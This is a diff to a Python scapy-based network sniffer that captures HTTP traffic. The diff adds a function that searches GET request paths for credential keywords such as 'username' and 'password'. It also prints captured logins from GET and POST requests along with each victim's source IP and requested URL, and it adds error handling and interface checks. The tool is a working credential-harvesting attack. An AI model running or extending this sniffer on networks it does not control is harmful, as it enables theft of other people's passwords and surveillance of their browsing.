@@ -20,11 +20,14 @@ def get_current_mac(interface):
 
 
 def get_current_ip(interface):
-	output = subprocess.check_output(["ifconfig",interface])
-	pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
-	output1 = output.decode()
-	ip = pattern.search(output1)[0]
-	return ip
+    try:
+        output = subprocess.check_output(["ifconfig",interface])
+        pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
+        output1 = output.decode()    
+        ip = pattern.search(output1)[0]
+        return ip
+    except:
+         return None
 
 
 def ip_table():
@@ -56,7 +59,7 @@ def ip_table():
 		ip = get_current_ip(k)
 		if ip and mac:
 			t.add_row([k,mac,ip])
-		elif mac:
+		elif mac and ip == None:
 			t.add_row([k,mac,f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
 		elif ip:
 			t.add_row([k,f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}",ip])
@@ -97,38 +100,61 @@ def process_sniffed_packet(packet):
         #if the packet has the http request then we check that it contain the RAW fied of the packet
         print("[+] HTTP REQUEST >>>>>")
         url_extractor(packet)
+        test0 = get_login_info_get(packet)
         test = get_login_info(packet)
+        if test0:
+            print(f"{Fore.GREEN}[+] Username OR password is Send In GET Request >>>> ", test0 ,f"{Style.RESET_ALL}")
         #if get_login_info found some then print those
         if test:
-            print(f"{Fore.GREEN}[+] Username OR password is Send >>>> ", test ,f"{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[+] Username OR password is Send In POST Request >>>> ", test ,f"{Style.RESET_ALL}")
         #To Print the raw Packet
         if (choice=="Y" or choice == "y"):
             raw_http_request(packet)
 
 
+def get_login_info_get(packet):
+      try:
+        if(packet.haslayer(http.HTTPRequest)):
+                path = packet.getlayer(http.HTTPRequest).fields
+                path = path["Path"]
+                path = path.decode()
+                print(path)
+                keywords = ["username","user","email","pass","login","password","UserName","Password"]
+                for i in keywords:
+                    if i in path:
+                        return path
+      except:
+        print("got an exception in get login info GET")
+        pass
 
 def get_login_info(packet):
-    if packet.haslayer(scapy.all.Raw):
-            #if it contain the raw fild then print that field post request 
-            load = packet[scapy.all.Raw].load
-            load_decode = load.decode()
-            keywords = ["username","user","email","pass","login","password","UserName","Password"]
-            for i in keywords:
-                if i in load_decode:
-                    return load_decode
-
+    try:   
+        if packet.haslayer(scapy.all.Raw):
+                #if it contain the raw fild then print that field post request 
+                load = packet[scapy.all.Raw].load
+                load_decode = load.decode()
+                keywords = ["username","user","email","pass","login","password","UserName","Password"]
+                for i in keywords:
+                    if i in load_decode:
+                        return load_decode
+    except:
+         print("got an exception in get login info")
+         pass
 
 
 def url_extractor(packet):
-    #get the http layer of the packet
-    #packet.show() or packet.summaery()
-    http_layer= packet.getlayer('HTTPRequest').fields
-    #get the ip layer of the packet 
-    ip_layer = packet.getlayer('IP').fields
-    #Print them in a readable form 
-    print(ip_layer["src"] , "just requested \n" ,http_layer["Method"].decode()," ",http_layer["Host"].decode(), " " ,http_layer["Path"].decode() )
-    return
-
+    try:
+        #get the http layer of the packet
+        #packet.show() or packet.summaery()
+        http_layer= packet.getlayer('HTTPRequest').fields
+        #get the ip layer of the packet 
+        ip_layer = packet.getlayer('IP').fields
+        #Print them in a readable form 
+        print(ip_layer["src"] , "just requested \n" ,http_layer["Method"].decode()," ",http_layer["Host"].decode(), " " ,http_layer["Path"].decode() )
+        return
+    except:
+         print("we got a exception in url extractor ")
+         pass
 
 def raw_http_request(packet):
     """
@@ -160,9 +186,16 @@ def main_sniff():
         global choice
         choice = input("[*] Do you want to to print the raw Packet : Y?N : ")
         ip_table()
+        addrs = psutil.net_if_addrs()
+        name = []
+        for k in addrs.items():
+            name.append(k[0])
         interface = input("[*] Please enter the interface name : ")
-        print("[*] Sniffing Packets...")
-        sniff(interface)
+        if interface in name:
+            print("[*] Sniffing Packets...")
+            sniff(interface)
+        else:
+            print(f"{Fore.RED}[!] Invalid Syntax. {Style.RESET_ALL}")
         print(f"{Fore.YELLOW}\n[*] Redirecting to Main Menu...{Style.RESET_ALL}")
         time.sleep(3)
     except KeyboardInterrupt:
